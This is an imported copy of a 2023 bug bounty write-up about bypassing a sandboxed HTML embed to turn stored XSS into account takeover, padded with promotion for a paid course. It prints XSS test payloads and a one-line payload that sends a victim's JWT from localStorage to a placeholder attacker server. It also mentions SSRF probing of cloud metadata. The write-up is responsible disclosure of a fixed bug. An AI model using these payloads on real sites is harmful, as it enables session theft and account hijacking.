---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-27_interesting-stored-xss-in-sandboxed-environment-to-full-account-takeover.md
original_filename: 2023-02-27_interesting-stored-xss-in-sandboxed-environment-to-full-account-takeover.md
title: Interesting Stored XSS in sandboxed environment to Full Account Takeover
category: documents
detected_topics:
- xss
- jwt
- ssrf
- command-injection
- otp
- api-security
tags:
- imported
- documents
- xss
- jwt
- ssrf
- command-injection
- otp
- api-security
language: en
raw_sha256: bc6f1318a44b3e0ddc93c18e2e6aecdd196a3b13fbce0a84b5275ef70ee47ac9
text_sha256: 032e207f9a894770d7f2be2b6b7c83f0d734c74bbef70c5679dbebac8d7503f4
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# Interesting Stored XSS in sandboxed environment to Full Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-27_interesting-stored-xss-in-sandboxed-environment-to-full-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, jwt, ssrf, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `bc6f1318a44b3e0ddc93c18e2e6aecdd196a3b13fbce0a84b5275ef70ee47ac9`
- Text SHA256: `032e207f9a894770d7f2be2b6b7c83f0d734c74bbef70c5679dbebac8d7503f4`


## Content

---
title: "Interesting Stored XSS in sandboxed environment to Full Account Takeover"
url: "https://varmaanu001.medium.com/interesting-stored-xss-in-sandboxed-environment-to-full-account-takeover-32e541062938"
authors: ["Anurag__Verma"]
bugs: ["Stored XSS", "Account takeover"]
publication_date: "2023-02-27"
added_date: "2023-02-28"
source: "pentester.land/writeups.json"
original_index: 1465
scraped_via: "browseros"
---

# Interesting Stored XSS in sandboxed environment to Full Account Takeover

Interesting Stored XSS in sandboxed environment to Full Account Takeover
Anurag__Verma
Follow
4 min read
·
Feb 27, 2023

121

1

Hi readers 👋, Hope everyone of you doing well,

Before moving to the article content here is little announcement 📢,

In collaboration with TMG Security (tmgsec.com) we have successfully launched ADVANCED BUG BOUNTY HUNTING V1.0 ,its a live training program starting from 10th march 2023 ,you can checkout the provided link and description is provided in the website.

Course contains amazing content like this article and more with chaining vulnerabilities impacting to full account takeover and many more… as shown in attached image.

This is just a trailer of the course content 🤑.

Advanced bug bounty v1.0: https://courses.tmgsec.com/courses/advance-bug-bounty-hunting-v1-0/

Press enter or click to view image in full size
Press enter or click to view image in full size
course syllabus

This is my new writeup related to interesting Stored Cross Scripting where i was able to bypass sandbox restriction additionally i was able to bypass httponly enabled restriction.

Lets get started,

Little About Sandboxing??

Sandboxing is a technique in which you create an isolated test environment, a “sandbox,” in which to execute or “detonate” a suspicious file or URL that is attached to an email or otherwise reaches your network and then observe what happens. If the file or URL displays malicious behavior, then you’ve discovered a new threat. The sandbox must be a secure, virtual environment that accurately emulates the CPU of your production servers.

reference: https://buildyourfuture.withgoogle.com/programs/google-sandbox

let us consider the target be target.com

Found a Embed HTML feature

embed feature

as you can see there are two features Embed URL and Embed HTML ,

First i tried using URL embed so i used ngrok to serve some payloads i tried for SSRF too like try for fetching internal server meta data like ec2,localhost in this case,but i didn’t succeeded for the ssrf so i moved on to xss.

Press enter or click to view image in full size

i tried for lots of paylods like svg,xml,js etc.but got hit for just html and just got iframe injection which was not able to access target DOM .

you can see in below screenhost document.domain showing ngrok link not he target means the payload runs in context to ngrok not the target.

Press enter or click to view image in full size

now i tried to embed simple payloads like

<script>alert(1)</script>,<script>confirm(1)</script>,print(1),prompt(1)

<img src=x onerror=prompt(1)> etc….

but the application refuses to run the payload due to the sandboxing.

Press enter or click to view image in full size

you can see above screenshot showing sandbox blocking the payloads.

Get Anurag__Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now ,no issue if alert(),confirm(),print(),prompt() are blocked our aim is to access victim DOM ,then i tried to simply access the DOM elements using payloads like console.log(document.cookie) and it worked .

Press enter or click to view image in full size
document.cookie working successfully

I quickly reported the issue to the team and they triaged the issue

But wait,there is some twist the main cookies (the sensitive one) in this case were JWT tokens are httponly set to true,means the cookies i was getting are just meta or non sensitive cookie.

Press enter or click to view image in full size
sensitive cookies set to httponly true

and therefore the company gives p4 priority to the issue which means it still considered a low issue.

low issue

I took some time to chain it to full account takeover and finally i found additional flaw in the application i noticed the same sensitive token were stored in the localStorage as id_token parameter.

Press enter or click to view image in full size
sensitive token stored in localStorage

I confirmed using burpcollaborator and tried to hijack the localstorage sensitive token and it worked successfully.

using payload like:

document.location="https://attacker-server?victim_jwt_token"+document.localStorage.getItem("id_token")

document.location=”https://attacker-server?victim_jwt_token”+document.localStorage.getItem(“id_token”)

Press enter or click to view image in full size

Then i confirmed account takeover and quickly added to comments in previous report and company confirm the reproduce the issue and team quickly updates the issue and increase the severity to p2.

Press enter or click to view image in full size

The Issue is resolved now ✅

I have upload video poc for the same on my channel so you can checkout the channel as well.

For other Interesting courses(Web/API/Android) checkout website link:https://courses.tmgsec.com/courses

For further queries you can reach out at: support@tmgsec.com

Hope you like the content ,thanks for reading.

suggestions are welcome.

Connect me

Youtube channel: redirect _poc

Linkedin: my_linkedin

Instagram : varmaanu001

buy me a coffee 😍: here
